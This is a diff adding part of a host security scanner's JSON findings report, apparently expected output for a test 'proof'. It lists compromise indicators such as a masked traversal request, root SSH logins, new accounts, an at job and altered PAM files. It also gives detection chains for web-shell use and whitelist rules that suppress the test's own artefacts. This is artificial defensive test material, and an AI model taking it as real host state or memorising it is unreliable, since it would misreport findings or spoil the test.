+    "summary": "member added: postfix group mail",
+    "entities": [
+     "account:postfix",
+     "group:mail"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:07",
+      "where": "auth_journal",
+      "text": "add 'postfix' to shadow group 'mail'"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:07.908371+00:00",
+    "last_seen": "2026-10-29T15:50:07.908371+00:00"
+   }
+  },
+  {
+   "id": "F-76",
+   "check": "persistence.homes",
+   "variant": null,
+   "band": "info",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A user's own systemd unit",
+   "from_host": {
+    "summary": "/home/USER-3-0000/.config/systemd/user/proof.service",
+    "entities": [
+     "path:/home/USER-3-0000/.config/systemd/user/proof.service"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "systemd",
+      "text": "/home/USER-3-0000/.config/systemd/user/proof.service: accounts=['USER-3-0000'] ctime=2026-10-29T15:50:04.264927+00:00 gid=0 home=/home/USER-3-0000 inode=264571 mode=0644 mtime=2026-10-29T15:50:04.264927+00:00 nlink=1 record=file sha256=e60d856a4702104ded06244a7ff06f71e2cc2aacc378e7fbba20762a507d56fd size=34 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-77",
+   "check": "web.exploit",
+   "variant": "refused",
+   "band": "info",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A traversal attack refused",
+   "from_host": {
+    "summary": "127.0.0.0/24: 1 request (status 404), e.g. /x?f=[MASKED:exploit:traversal]",
+    "entities": [
+     "address:127.0.0.0/24"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:23",
+      "where": "web_logs:/var/log/nginx/access.log",
+      "text": "127.0.0.1 - - [29/Oct/2026:15:50:23 +0000] \"GET /x?f=[MASKED:exploit:traversal] HTTP/1.1\" 404 3332 \"https://ref.example/[MASKED:referrer]\" \"curl/7.76.1\" \"-\""
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:23.041747+00:00",
+    "last_seen": "2026-10-29T15:50:23.041747+00:00"
+   }
+  },
+  {
+   "id": "F-78",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/NetworkManager/NetworkManager.conf (NetworkManager): changed",
+    "entities": [
+     "path:/etc/NetworkManager/NetworkManager.conf",
+     "package:NetworkManager"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/NetworkManager/NetworkManager.conf: configuration=True package=NetworkManager results=['changed']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-79",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/nsswitch.conf (glibc): mode",
+    "entities": [
+     "path:/etc/nsswitch.conf",
+     "package:glibc"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/nsswitch.conf: configuration=True expected_mode=100644 mode=120777 package=glibc results=['mode']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-80",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/pam.d/fingerprint-auth (pam): mode, unreadable",
+    "entities": [
+     "path:/etc/pam.d/fingerprint-auth",
+     "package:pam"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/pam.d/fingerprint-auth: configuration=True expected_mode=100644 mode=120777 package=pam reason=[Errno 40] Too many levels of symbolic links: '/etc/pam.d/fingerprint-auth' results=['mode', 'unreadable']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-81",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/pam.d/password-auth (pam): mode, unreadable",
+    "entities": [
+     "path:/etc/pam.d/password-auth",
+     "package:pam"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/pam.d/password-auth: configuration=True expected_mode=100644 mode=120777 package=pam reason=[Errno 40] Too many levels of symbolic links: '/etc/pam.d/password-auth' results=['mode', 'unreadable']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-82",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/pam.d/postlogin (pam): mode, unreadable",
+    "entities": [
+     "path:/etc/pam.d/postlogin",
+     "package:pam"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/pam.d/postlogin: configuration=True expected_mode=100644 mode=120777 package=pam reason=[Errno 40] Too many levels of symbolic links: '/etc/pam.d/postlogin' results=['mode', 'unreadable']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-83",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/pam.d/smartcard-auth (pam): mode, unreadable",
+    "entities": [
+     "path:/etc/pam.d/smartcard-auth",
+     "package:pam"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/pam.d/smartcard-auth: configuration=True expected_mode=100644 mode=120777 package=pam reason=[Errno 40] Too many levels of symbolic links: '/etc/pam.d/smartcard-auth' results=['mode', 'unreadable']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-84",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/pam.d/sshd (openssh-server): changed",
+    "entities": [
+     "path:/etc/pam.d/sshd",
+     "package:openssh-server"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/pam.d/sshd: configuration=True package=openssh-server results=['changed']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-85",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/pam.d/system-auth (pam): mode, unreadable",
+    "entities": [
+     "path:/etc/pam.d/system-auth",
+     "package:pam"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/pam.d/system-auth: configuration=True expected_mode=100644 mode=120777 package=pam reason=[Errno 40] Too many levels of symbolic links: '/etc/pam.d/system-auth' results=['mode', 'unreadable']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-86",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/shadow (setup): mode",
+    "entities": [
+     "path:/etc/shadow",
+     "package:setup"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/shadow: configuration=True expected_mode=100000 mode=100200 package=setup results=['mode']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-87",
+   "check": "package.changed",
+   "variant": null,
+   "band": "info",
+   "category": "hygiene",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": null,
+   "title": "A package's configuration file was edited",
+   "from_host": {
+    "summary": "/etc/ssh/sshd_config (openssh-server): changed",
+    "entities": [
+     "path:/etc/ssh/sshd_config",
+     "package:openssh-server"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "package_changes",
+      "text": "/etc/ssh/sshd_config: configuration=True package=openssh-server results=['changed']"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-36",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": "proof-USER-3-0000-account",
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: USER-3-0000 UID 1001",
+    "entities": [
+     "account:USER-3-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:04",
+      "where": "auth_journal",
+      "text": "new user: name=USER-3-0000, UID=1001, GID=1001, home=/home/USER-3-0000, shell=/bin/bash, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:04.200782+00:00",
+    "last_seen": "2026-10-29T15:50:04.200782+00:00"
+   }
+  },
+  {
+   "id": "F-37",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": "proof-USER-4-0000-account",
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: USER-4-0000 UID 1000",
+    "entities": [
+     "account:USER-4-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:49:58",
+      "where": "auth_journal",
+      "text": "new user: name=USER-4-0000, UID=1000, GID=1000, home=/home/USER-4-0000, shell=/bin/sh, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:49:58.698342+00:00",
+    "last_seen": "2026-10-29T15:49:58.698342+00:00"
+   }
+  },
+  {
+   "id": "F-43",
+   "check": "persistence.at_jobs",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": "proof-at-job-redhat",
+   "title": "A queued at job",
+   "from_host": {
+    "summary": "/var/spool/at/a0000101c80f0e (owner UID 0)",
+    "entities": [
+     "path:/var/spool/at/a0000101c80f0e"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "cron",
+      "text": "/var/spool/at/a0000101c80f0e: content_sha256=f7aa0ad5dc44d32fc26cfc4cf7b208d920282eccebc8affe770cd6428935df29 ctime=2026-10-29T15:50:04.254927+00:00 gid=0 inode=264567 mode=0700 mtime=2026-10-29T15:50:04.254927+00:00 nlink=1 record=file sha256=5ee9cd0758e6bfa0fbe63e23df005eb6a39b92c3f66e085f7dfcf2a0a7406529 size=1434 type=- uid=…"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-55",
+   "check": "ssh.login",
+   "variant": "root_login",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.0,
+   "suppressed_by": "proof-root-login",
+   "title": "A direct root login over SSH",
+   "from_host": {
+    "summary": "root from 127.0.0.1 (publickey)",
+    "entities": [
+     "account:root",
+     "address:127.0.0.1"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:21",
+      "where": "auth_journal",
+      "text": "Accepted publickey for root from 127.0.0.1 port 51716 ssh2: ED25519 KEY-3-0000"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:21.619723+00:00",
+    "last_seen": "2026-10-29T15:51:21.619723+00:00"
+   }
+  },
+  {
+   "id": "F-56",
+   "check": "ssh.login",
+   "variant": "root_login",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": "proof-root-login",
+   "title": "A direct root login over SSH",
+   "from_host": {
+    "summary": "root from IP-2-0000 (publickey)",
+    "entities": [
+     "account:root",
+     "address:IP-2-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:48:12",
+      "where": "auth_journal",
+      "text": "Accepted publickey for root from IP-2-0000 port 34556 ssh2: ED25519 KEY-4-0000"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:48:12.176053+00:00",
+    "last_seen": "2026-10-29T15:48:12.176053+00:00"
+   }
+  },
+  {
+   "id": "F-74",
+   "check": "process.injected",
+   "variant": "libffi",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0,
+   "suppressed_by": "base-firewalld-libffi",
+   "title": "A process has libffi code mapped from memory only",
+   "from_host": {
+    "summary": "firewalld (pid 624): /memfd:libffi (deleted)",
+    "entities": [
+     "program:firewalld",
+     "pid:624",
+     "exe:/usr/bin/python3.9"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=624 ppid=1 comm=firewalld exe=/usr/bin/python3.9 cmdline=/usr/bin/python3 -s /usr/sbin/firewalld --nofork --nopid uids=[0, 0, 0, 0] start_time=2026-10-29T15:48:03.610000+00:00 cwd=/"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:48:03.610000+00:00",
+    "last_seen": "2026-10-29T15:48:03.610000+00:00"
+   }
+  }
+ ],
+ "omitted": null,
+ "chains": [
+  {
+   "chain": "new-account-escalated-used",
+   "title": "A new account or key, given privilege, then used to log in",
+   "findings": [
+    "F-19",
+    "F-25"
+   ],
+   "account": "USER-2-0000"
+  },
+  {
+   "chain": "web-shell-used",
+   "title": "A script new since the baseline answered requests, then the web account started a shell or tool",
+   "findings": [
+    "F-26",
+    "F-27"
+   ],
+   "account": "apache"
+  }
+ ],
+ "whitelist_rules": [
+  {
+   "id": "proof-at-job-redhat",
+   "layer": "host HOST-1-0000",
+   "match": {
+    "check": "persistence.at_jobs",
+    "path": "/var/spool/at/*"
+   },
+   "reason": "The proof queues an at job for the persistence modules to find.",
+   "expires": "never"
+  },
+  {
+   "id": "proof-root-login",
+   "layer": "host HOST-1-0000",
+   "match": {
+    "check": "ssh.login",
+    "variant": "root_login",
+    "account": "root"
+   },
+   "reason": "The proof logs in as root to set the server up.",
+   "expires": "never"
+  },
+  {
+   "id": "proof-USER-3-0000-account",
+   "layer": "host HOST-1-0000",
+   "match": {
+    "check": "account.log_changes",
+    "account": "USER-3-0000"
+   },
+   "reason": "The proof creates USER-3-0000 to give the persistence modules something to find.",
+   "expires": "never"
+  },
+  {
+   "id": "proof-USER-4-0000-account",
+   "layer": "host HOST-1-0000",
+   "match": {
+    "check": "account.log_changes",
+    "account": "USER-4-0000"
+   },
+   "reason": "The proof creates the USER-4-0000 account, as docs/USER-4-0000-account.md sets it up.",
+   "expires": "never"
+  },
+  {
+   "id": "base-firewalld-libffi",
+   "layer": "profile base",
+   "match": {
+    "check": "process.injected",
+    "variant": "libffi",
+    "program": "firewalld",
+    "exe": "/usr/bin/python3*"
+   },
+   "reason": "firewalld (RHEL, Rocky, Alma) runs on Python, whose ctypes has libffi make its closures in memory-only files. Only the libffi kind, only firewalld on the system's Python: another Python process with such a file stays a (low) finding, and code from a deleted or scratch file always does.",
+   "expires": "never"
+  }
+ ],
+ "from_host": {
+  "coverage_gaps": [],
+  "log_reach_days": {},
+  "notes": []
+ },
+ "address_kinds": {
+  "IP-1-0000": "link-local",
+  "IP-2-0000": "private or reserved"
+ }
+}
